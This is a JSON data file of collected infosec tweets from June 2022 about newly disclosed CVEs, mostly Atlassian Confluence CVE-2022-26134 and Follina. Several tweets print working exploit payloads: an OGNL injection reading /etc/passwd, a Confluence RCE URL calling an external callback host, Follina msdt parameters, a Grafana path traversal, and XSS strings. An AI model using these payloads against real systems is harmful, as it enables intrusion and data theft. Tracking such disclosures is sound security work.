+    "tweettext": "CVE-2022-27924 allows an unauthenticated, remote attacker to dump clear-text creds from a Zimbra instance with default config. We used Memcache response injection to bypass restrictions. Apparently Zimbra is used by over 200.000. Patch now! https://t.co/7ziBH7G4ax",
+    "tweettime": "2022-06-14, 17:45:38",
+    "tweeturl": "https://twitter.com/scannell_simon/status/1536766828491456514",
+    "username": "scannell_simon"
+}
+{
+    "expanded_url": [
+        "https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/"
+    ],
+    "tweetfavorites": 121,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "CVE-2022-25845 – Analyzing the Fastjson “Auto Type Bypass” RCE vulnerability https://t.co/eZSzQB2xIc",
+    "tweettime": "2022-06-14, 15:43:06",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1536735993889316864",
+    "username": "_r_netsec"
+}
+{
+    "tweetfavorites": 262,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 52,
+    "tweettext": "I create a custom nuclei template for mass hunting recent CVE-2022-29455(XSS)\n#bugbounty #nuclei https://t.co/uMC9ldy3CJ",
+    "tweettime": "2022-06-14, 04:54:33",
+    "tweeturl": "https://twitter.com/tamimhasan404/status/1536572780325392384",
+    "username": "tamimhasan404"
+}
+{
+    "expanded_url": [
+        "https://github.com/tr3ee/CVE-2022-23222"
+    ],
+    "tweetfavorites": 538,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 189,
+    "tweettext": "CVE-2022-23222: Linux kernel through 5.15.14 allows local users to gain privileges because of the availability of pointer arithmetic via certain *_OR_NULL pointer types.\n\nPoC\nhttps://t.co/zFAfB0UXg3 https://t.co/lBT5BLTO6w",
+    "tweettime": "2022-06-12, 07:47:27",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1535891514387218432",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/aaronsvk/CVE-2022-30075"
+    ],
+    "tweetfavorites": 479,
+    "tweetquotes": 6,
+    "tweetreplies": 7,
+    "tweetretweets": 184,
+    "tweettext": "CVE-2022-30075: Authenticated Remote Code Execution in Tp-Link Routers.\n\nPoC\nhttps://t.co/AGyD2CVWA8 https://t.co/qU87X48x39",
+    "tweettime": "2022-06-12, 07:45:12",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1535890951226462208",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://cert.gov.ua/article/160530"
+    ],
+    "tweetfavorites": 122,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 64,
+    "tweettext": "Attempted cyberattack/operation aimed at Ukrainian media organizations (radio stations, newspapers, news agencies, etc.). Suspected Sandworm group trying to exploit CVE-2022-30190 (fresh, remote code execution vulnerability via Office/Word) https://t.co/UtHWUvnwCk https://t.co/yznXpfh7Ys",
+    "tweettime": "2022-06-11, 15:20:47",
+    "tweeturl": "https://twitter.com/lukOlejnik/status/1535643213712830466",
+    "username": "lukOlejnik"
+}
+{
+    "expanded_url": [
+        "https://github.com/aaronsvk/CVE-2022-30075"
+    ],
+    "tweetfavorites": 182,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 101,
+    "tweettext": "Researcher releases PoC exploit for a new authenticated RCE #vulnerability (CVE-2022-30075) affecting Tp-Link routers.\n\nhttps://t.co/MwaPmYk9HG\n\n\"If your Tp-Link router has backup and restore functionality and firmware is older than june 2022, it is probably vulnerable\" https://t.co/GtXG37KzNf",
+    "tweettime": "2022-06-11, 13:50:11",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1535620414268899329",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6015b5npx"
+    ],
+    "tweetfavorites": 161,
+    "tweetquotes": 7,
+    "tweetreplies": 4,
+    "tweetretweets": 82,
+    "tweettext": "Multiple adversaries and nation-state actors, including DEV-0401 and DEV-0234, are taking advantage of the Atlassian Confluence RCE vulnerability CVE-2022-26134. We urge customers to upgrade to the latest version or apply recommended mitigations: https://t.co/C3CykQgrOJ",
+    "tweettime": "2022-06-11, 00:24:59",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1535417776290111489",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "I just wrote a technical analysis blog about Confluence CVE-2022-26134, especially focus on Confluence version 7.18.0 where isSafeExpression is introduced and different ways that you can bypass it :). If you have any questions, please dm me :)\nhttps://t.co/AqWJ11qko5",
+    "tweettime": "2022-06-10, 15:42:05",
+    "tweeturl": "https://twitter.com/mr_r3bot/status/1535286185358401536",
+    "username": "mr_r3bot"
+}
+{
+    "tweetfavorites": 112,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "CVE-2022-31402 iTop 3.0.1 XSS Vulnerability\n\nhttp://localhost/itop/webservices/export-v2.php\"()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;N8Zn(9266)&lt;/ScRiPt&gt;",
+    "tweettime": "2022-06-10, 04:36:33",
+    "tweeturl": "https://twitter.com/momika233/status/1535118697466953728",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/7/cve-2022-26937-microsoft-windows-network-file-system-nlm-portmap-stack-buffer-overflow"
+    ],
+    "tweetfavorites": 155,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 77,
+    "tweettext": "The latest blog from the Trend Micro Research Team looks at CVE-2022-26937: a Microsoft Windows NFS NLM Portmap stack buffer overflow that could lead to RCE. They provide root cause, source code walkthrough, and detection guidance. https://t.co/FhKhIeoG35",
+    "tweettime": "2022-06-08, 14:27:58",
+    "tweeturl": "https://twitter.com/thezdi/status/1534542758991511557",
+    "username": "thezdi"
+}
+{
+    "tweetfavorites": 141,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "CVE-2022-1588 Contao 4.13.2 Cross-Site Scripting (XSS)\nURL: https://localhost/contao/\"&gt;&lt;svg//onload=alert('momika233')&gt;",
+    "tweettime": "2022-06-08, 01:39:15",
+    "tweeturl": "https://twitter.com/momika233/status/1534349304688967680",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 146,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 47,
+    "tweettext": "#CVE-2022-26134 Atlassian Confluence RCE \n\nboolean authenticate(String username, String password) https://t.co/rXZbj7pk70",
+    "tweettime": "2022-06-07, 13:47:09",
+    "tweeturl": "https://twitter.com/jas502n/status/1534170095932821504",
+    "username": "jas502n"
+}
+{
+    "tweetfavorites": 921,
+    "tweetquotes": 10,
+    "tweetreplies": 22,
+    "tweetretweets": 304,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd",
+    "tweettime": "2022-06-07, 09:30:36",
+    "tweeturl": "https://twitter.com/momika233/status/1534105534793920512",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1913/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 7,
+    "tweettext": "\"CVE-2022-30190 MSDT PowerShell Code Injection Vulnerability Analysis\" https://t.co/ViRj51xWLf (Chinese) by HuanGMz@KnownSec  404 Team . The original model of the vulnerability is code injection caused by the lack of filtering $ in the .AddScript() function parameter. https://t.co/Cbz3VnMbKI",
+    "tweettime": "2022-06-07, 06:29:54",
+    "tweeturl": "https://twitter.com/80vul/status/1534060061869285377",
+    "username": "80vul"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/blog/observed-in-the-wild-atlassian-confluence-server-cve-2022-26134"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 25,
+    "tweettext": "800+ unique IPs and counting... read fresh insights from our research team on zero-day vulnerability Atlassian Confluence CVE-2022-26134. https://t.co/dvG31gk1xv",
+    "tweettime": "2022-06-06, 22:38:29",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1533941426320310272",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://www.mozilla.org/en-US/security/bug-bounty/hall-of-fame/"
+    ],
+    "tweetfavorites": 82,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 8,
+    "tweettext": "Got a spot in Mozilla Hall of Fame (1st Quarter 2022) by reporting CVE-2022-26381 (Mozilla Firefox textPath Element Use-After-Free Remote Code Execution Vulnerability):\nhttps://t.co/RKW4yefPVL",
+    "tweettime": "2022-06-06, 21:44:06",
+    "tweeturl": "https://twitter.com/hosselot/status/1533927736888238090",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32275"
+    ],
+    "tweetfavorites": 333,
+    "tweetquotes": 10,
+    "tweetreplies": 2,
+    "tweetretweets": 103,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd URI. https://t.co/1LMJnFOkbZ",
+    "tweettime": "2022-06-06, 19:45:23",
+    "tweeturl": "https://twitter.com/CVEnew/status/1533897860583931905",
+    "username": "CVEnew"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 38,
+    "tweettext": "Technical Analysis and Exploitation of CVE-2022-26134, critical unauthenticated RCE in Confluence, by @rapid7  \n\nhttps://t.co/3xQzizl2ko\n\n#infosec #cybersecurity #bugbounty #pentest https://t.co/Mi65pQKUaL",
+    "tweettime": "2022-06-06, 19:00:09",
+    "tweeturl": "https://twitter.com/payloadartist/status/1533886478291714049",
+    "username": "payloadartist"
+}
+{
+    "tweetfavorites": 284,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 94,
+    "tweettext": "🦥 Everyone learned to run pip install colorama to exploit Atlassian Confluence RCE (CVE-2022-26134), so let’s see how the vulnerability works under the hood.\n\nHere we show our simplified payload which demonstrates a workflow inside the vulnerable code ⤵️ https://t.co/szijIM84hd",
+    "tweettime": "2022-06-06, 13:37:42",
+    "tweeturl": "https://twitter.com/ptswarm/status/1533805332409069568",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://www.reddit.com/r/blueteamsec/comments/v56qin/cve202226134_confluence_zero_day_remote_code/"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 10,
+    "tweettext": "/r/blueteamsec are now running one of our now (infamous?) threads on CVE-2022-26134 aka the Confluence Zero Day - with technical analysis, exploits, active exploitation updates, detections and more.. \n\nhttps://t.co/dHEkcymrkf",
+    "tweettime": "2022-06-06, 10:58:21",
+    "tweeturl": "https://twitter.com/ollieatnccgroup/status/1533765228072148994",
+    "username": "ollieatnccgroup"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134?fbclid=IwAR0tZiWJjBJHu5slC4ZUfGK00Bew8tbp2xCLrQvD0uZjkPLOvFUvzhmWtbE"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "CVE-2022-26134 Atlassian\n\n${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"cat /etc/passwd\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))}\n\nhttps://t.co/nrwWLejKgW https://t.co/YO1WzL9MJV",
+    "tweettime": "2022-06-06, 06:36:43",
+    "tweeturl": "https://twitter.com/wugeej/status/1533699386542534662",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://viz.greynoise.io/query/?gnql=tags%3A%22Atlassian%20Confluence%20Server%20CVE-2022-26134%20OGNL%20Injection%20Attempt%22"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 84,
+    "tweettext": "Widespread Atlassian Confluence CVE-2022-26134 exploitation, specifically that is *confirmed functional*, has just started. 23 unique IPs so far.\n\n-Tags available to all @GreyNoiseIO users now\n- Create an account to deploy a dynamic block list to block it\n\nhttps://t.co/dbXTw2LWY6 https://t.co/xXldngWdPH",
+    "tweettime": "2022-06-04, 17:31:37",
+    "tweeturl": "https://twitter.com/Andrew___Morris/status/1533139425122713600",
+    "username": "Andrew___Morris"
+}
+{
+    "tweetfavorites": 168,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 47,
+    "tweettext": "Confluence RCE (CVE-2022-26134)\nPoc:\n\n{{BaseURL}}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{{interactsh-url}}%22%29%7D/",
+    "tweettime": "2022-06-04, 11:44:13",
+    "tweeturl": "https://twitter.com/S0ufi4n3/status/1533051998077067267",
+    "username": "S0ufi4n3"
+}
+{
+    "tweetfavorites": 366,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 108,
+    "tweettext": "CVE-2022-26134  Confluence RCE exploit automation :\n\nhttpx -l list.txt  -paths path.txt  -match-string \"gid=\"",
+    "tweettime": "2022-06-04, 10:00:04",
+    "tweeturl": "https://twitter.com/h4x0r_dz/status/1533025788672593920",
+    "username": "h4x0r_dz"
+}
+{
+    "tweetfavorites": 397,
+    "tweetquotes": 3,
+    "tweetreplies": 10,
+    "tweetretweets": 81,
+    "tweettext": "CVE-2022-26134: Atlassian Confluence RCE PoC\n\n#BugBounty https://t.co/7UFw7TkwME",
+    "tweettime": "2022-06-04, 06:02:51",
+    "tweeturl": "https://twitter.com/sheikhrishad0/status/1532966090841915392",
+    "username": "sheikhrishad0"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134"
+    ],
+    "tweetfavorites": 192,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 64,
+    "tweettext": "Atlassian Confluence (CVE-2022-26134) - Unauthenticated Remote Code Execution (RCE)\nURL：https://t.co/OXIOSvXHL4",
+    "tweettime": "2022-06-04, 04:24:06",
+    "tweeturl": "https://twitter.com/momika233/status/1532941237405499392",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 475,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 152,
+    "tweettext": "Thread - Confluence Blind OGNL Injection analysis from our limited java knowledge. From vulnerable sink to becoming admin of the confluence instance. #CVE-2022-26134. Tested on latest vulnerable version 7.18.0.",
+    "tweettime": "2022-06-04, 03:16:31",
+    "tweeturl": "https://twitter.com/httpvoid0x2f/status/1532924231054499840",
+    "username": "httpvoid0x2f"
+}
+{
+    "expanded_url": [
+        "https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134"
+    ],
+    "tweetfavorites": 562,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 200,
+    "tweettext": "Very simple POC for Atlassian Confluence Pre-Auth OGNL Injection &amp;&amp; RCE (CVE-2022-26134)\nSetup a pre-built environment to test it in 5 seconds: https://t.co/oH6GJ1mel1\nWhy 5 minutes not 10 seconds? Because you should apply a trial license from Atlassian😂#vulhub https://t.co/CS1EVOHbKg",
+    "tweettime": "2022-06-04, 00:50:44",
+    "tweeturl": "https://twitter.com/phithon_xg/status/1532887542722269184",
+    "username": "phithon_xg"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
+    ],
+    "tweetfavorites": 98,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 41,
+    "tweettext": "⚠️ CVE-2022-26134 event detected ⚠️\n\nSource IP:\n193.106.191.48 (🇷🇺)\n\nTarget:\nAtlassian Confluence servers vulnerable to unauthenticated remote code execution (https://t.co/mZ6pPfOBws)\n\nLast seen:\n2022-06-03T21:32:10Z\n#threatintel",
+    "tweettime": "2022-06-03, 22:01:05",
+    "tweeturl": "https://twitter.com/bad_packets/status/1532844850298597376",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2022-26134 - Script PoC that exploit the remote code execution vulnerability affecting Atlassian Confluence products 7.18.1 and under. This vulnerability is exploitable without requiring authentication!\n\n#Confluence  #Atlassian #infosec #0day #PoC\nhttps://t.co/HUylvXQ6i0",
+    "tweettime": "2022-06-03, 21:41:53",
+    "tweeturl": "https://twitter.com/Naqwada_/status/1532840017894469632",
+    "username": "Naqwada_"
+}
+{
+    "expanded_url": [
+        "http://go.usa.gov/xJWGw"
+    ],
+    "tweetfavorites": 77,
+    "tweetquotes": 3,
+    "tweetreplies": 5,
+    "tweetretweets": 63,
+    "tweettext": "🚨 Atlassian has released new Confluence Server and Data Center versions to address RCE vulnerability CVE-2022-26134. Update immediately! Read more at https://t.co/wxbzPoWfqi. #Cybersecurity #InfoSec https://t.co/frTQpH4Rax",
+    "tweettime": "2022-06-03, 20:37:59",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1532823934156034048",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/4527"
+    ],
+    "tweetfavorites": 294,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 72,
+    "tweettext": "None-Intrusive @pdnuclei  template for the Confluence RCE vulnerability CVE-2022-26134 is available\n\nhttps://t.co/BGJTz82dmu\n\nConfirmation of hits by DNS callbacks with nslookup to interactsh servers. https://t.co/e42OaNI6mT",
+    "tweettime": "2022-06-03, 20:23:43",
+    "tweeturl": "https://twitter.com/naglinagli/status/1532820345018785792",
+    "username": "naglinagli"
+}
+{
+    "tweetfavorites": 75,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 5,
+    "tweettext": "I wonder if releasing the Confluence RCE patch for CVE-2022-26134 within the weekend was a good idea 🤔 instead of 1 APT exploiting it in the wild now everyone got a working PoC and already mass exploit it 🤡\n\n#BugBounty #infosec",
+    "tweettime": "2022-06-03, 20:15:30",
+    "tweeturl": "https://twitter.com/naglinagli/status/1532818278061641731",
+    "username": "naglinagli"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 208,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 94,
+    "tweettext": "Our technical analysis and curl based PoC for Confluence CVE-2022-26134 can be found here: https://t.co/LUc4286Cj4",
+    "tweettime": "2022-06-03, 19:37:29",
+    "tweeturl": "https://twitter.com/Junior_Baines/status/1532808712070512647",
+    "username": "Junior_Baines"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 29,
+    "tweettext": "It looks like CVE-2022-26134 (Unauthenticated RCE via OGNL template injection) uses the same vector as CVE-2021-26084.\n\nHere is an attack via CVE-2021-26084 that I was checking on 2022-05-16 that allowed to create a webshell in ./confluence/testAnt.jsp\n\nJust for comparison 🤔 https://t.co/mER1UCe5Ke",
+    "tweettime": "2022-06-03, 19:14:47",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1532802996362526720",
+    "username": "1ZRR4H"
+}
+{
+    "tweetfavorites": 62,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 20,
+    "tweettext": "There is an RCE PoC for CVE-2022-26134 in this blog post. I haven't tested it yet.",
+    "tweettime": "2022-06-03, 19:12:41",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532802468068962304",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 195,
+    "tweetquotes": 10,
+    "tweetreplies": 2,
+    "tweetretweets": 118,
+    "tweettext": "The Rapid7 team has a root cause analysis of Confluence CVE-2022-26134 out now with thanks to @Junior_Baines. This is an emergency mitigation situation. https://t.co/2G9H6OmJA6",
+    "tweettime": "2022-06-03, 19:05:25",
+    "tweeturl": "https://twitter.com/catc0n/status/1532800640371531777",
+    "username": "catc0n"
+}
+{
+    "tweetfavorites": 102,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 30,
+    "tweettext": "Looking at the patch for Atlassian Confluence CVE-2022-26134 on my lunch break...\n\n-        final String finalNamespace = TextParseUtil.translateVariables(this.namespace, stack);\n-        final String finalActionName = TextParseUtil.translateVariables(this.actionName, stack);\n\n👀",
+    "tweettime": "2022-06-03, 17:11:20",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532771930960445449",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 219,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 82,
+    "tweettext": "This is real. We've confirmed it to work on fully patched Windows. The attack scenario is similar to CVE-2020-1300: get the user to open a CAB file, and a malicious executable is silently copied to their StartUp folder, to be launched the next time they login.",
+    "tweettime": "2022-06-03, 12:43:25",
+    "tweeturl": "https://twitter.com/mkolsek/status/1532704505577541637",
+    "username": "mkolsek"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/06/hackers-exploiting-unpatched-critical.html"
+    ],
+    "tweetfavorites": 134,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 101,
+    "tweettext": "Researchers have uncovered a critical unpatched RCE #vulnerability (CVE-2022-26134) affecting #Atlassian Confluence Server and Data Center products that is being actively exploited by hackers.\n\nRead details: https://t.co/DKvtuJIUr4\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-06-03, 03:44:37",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1532568914151976961",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/NafisiAslH/KnowledgeSharing/tree/main/CyberSecurity/Web/CVEs/CVE-2022/CVE-2022-30190?fbclid=IwAR0UczaWjJNKWTnlvZHCXsWhABuae0kDRKx3hj-wo0LS1y8TZ32HR5w9t3w"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "CVE-2022-30190 : Microsoft Windows Support Diagnostic Tool RCE https://t.co/IztgFGowq9",
+    "tweettime": "2022-06-03, 01:58:06",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1532542109328150528",
+    "username": "_r_netsec"
+}
+{
+    "expanded_url": [
+        "https://blog.reconinfosec.com/analysis-of-exploitation-of-cve-2019-3396"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "For teams dealing with CVE-2022-26134, see this blog post which analyzes a previous Confluence RCE (CVE-2019-3396). It may provide insight into how to approach a breach involving Confluence.\n\nhttps://t.co/A9dKJHktyp",
+    "tweettime": "2022-06-03, 00:54:09",
+    "tweeturl": "https://twitter.com/Recon_InfoSec/status/1532526015188180997",
+    "username": "Recon_InfoSec"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xJDf2"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 16,
+    "tweetreplies": 2,
+    "tweetretweets": 76,
+    "tweettext": "🚨 A RCE Vulnerability (CVE-2022-26134) in Atlassian's Confluence Server and Data Center is being actively exploited. ⛔ Block all internet traffic to and from those devices until an update is available and applied. @CISAgov's KEV now includes this vul: https://t.co/9vliOlJpmd https://t.co/YNltqOCDs7",
+    "tweettime": "2022-06-02, 23:56:11",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1532511428451631108",
+    "username": "USCERT_gov"
+}
+{
+    "tweetfavorites": 36,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 6,
+    "tweettext": "\"When initially analyzing the exploit, Volexity noted it looked similar to previous vulnerabilities that have also been exploited in order to gain remote code execution.\"\n\n\"It should also be noted that CVE-2022-26134 appears to be another command injection vulnerability.\"\n\n👀",
+    "tweettime": "2022-06-02, 23:03:53",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532498264242769925",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
+    ],
+    "tweetfavorites": 227,
+    "tweetquotes": 16,
+    "tweetreplies": 7,
+    "tweetretweets": 122,
+    "tweettext": "Atlassian is warning about a zero-day in Confluence (CVE-2022-26134). This is a pre-auth, remote code execution bug. No patch yet. Atlassian credits @Volexity which reported it after responding to different victims who got shells/backdoors via this flaw. https://t.co/3AgnpQ1fB3",
+    "tweettime": "2022-06-02, 22:40:49",
+    "tweeturl": "https://twitter.com/briankrebs/status/1532492461939085329",
+    "username": "briankrebs"
+}
+{
+    "tweetfavorites": 99,
+    "tweetquotes": 6,
+    "tweetreplies": 4,
+    "tweetretweets": 28,
+    "tweettext": "Whomp whomp “Confluence Security Advisory 2022-06-02\nConfluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability” https://t.co/LdcjCdNVSa",
+    "tweettime": "2022-06-02, 21:54:54",
+    "tweeturl": "https://twitter.com/HackingLZ/status/1532480905335345152",
+    "username": "HackingLZ"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/1/is-exploiting-a-null-pointer-deref-for-lpe-just-a-pipe-dream"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 39,
+    "tweettext": "Is exploiting a null pointer deref for LPE just a pipe dream? @izobashi shows the process discovering a couple of #Bitdefender AV bugs (CVE-2021-4198/CVE-2021-4199). The exploit leads to LPE by exploiting a link following issue. https://t.co/YH9f35RU6W",
+    "tweettime": "2022-06-02, 15:15:54",
+    "tweeturl": "https://twitter.com/thezdi/status/1532380491311108096",
+    "username": "thezdi"
+}
+{
+    "tweetfavorites": 248,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 91,
+    "tweettext": "🎁 PoC for a Post-Auth SQL-Injection (CVE-2022-0757) in Nexpose Vulnerability Scanner &lt;= 6.6.128\n\nDefault port: 3780\nDefault username: nxadmin\nAffected handler: /data/asset/filterAssets\n\nFull Request ⤵️ https://t.co/Fi403Zjk9a",
+    "tweettime": "2022-06-02, 14:24:10",
+    "tweeturl": "https://twitter.com/ptswarm/status/1532367472241909760",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "http://dlvr.it/SRV16J"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "CVE-2022-1972: out-of-bound write in Linux netfilter subsystem leads to local privilege escalation: Posted by 张子明(明程) on Jun 02Hello,\n \n An out-of-bound write vulnerability was identified within the\n netfilter subsystem\n which can be exploited to… https://t.co/lLqUCOykeo",
+    "tweettime": "2022-06-02, 10:58:01",
+    "tweeturl": "https://twitter.com/oss_security/status/1532315596653596672",
+    "username": "oss_security"
+}
+{
+    "expanded_url": [
+        "https://github.com/PwnC00re/PoC-CVE-2022-30190?fbclid=IwAR07oJZ7iL0ZyuAXNOflJyttKodx7Tba9Zmp_38ulPpZHpi6GgCc4eYMxZg"
+    ],
+    "tweetfavorites": 327,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 138,
+    "tweettext": "0-day [CVE-2022-30190] MS Offic RCE aka msdt follina\n\nTarget = \"http://&lt;payload_server&gt;/payload.html!\"\nTargetMode = \"External\"\n\nIT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../Windows/System32\n\nhttps://t.co/Bci6gVBWJn https://t.co/hc2TcRoOQt",
+    "tweettime": "2022-06-02, 02:35:49",
+    "tweeturl": "https://twitter.com/wugeej/status/1532189210425577472",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://tcm-sec.com/follina-rce-exploitation-cve-2022-30190/"
+    ],
+    "tweetfavorites": 148,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "Let's learn more about the newest exploit going around, Follina RCE - CVE-2022-30190.  Joe Helle takes us through and shows us a couple ways this exploitation works and what you can do to remedy this current issue.\n\nhttps://t.co/uvIHdUi8QP\n\n#follina #cve #exploitation https://t.co/uXciZocib3",
+    "tweettime": "2022-06-01, 17:29:42",
+    "tweeturl": "https://twitter.com/thecybermentor/status/1532051776651788293",
+    "username": "thecybermentor"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/horde-webmail-rce-via-email/"
+    ],
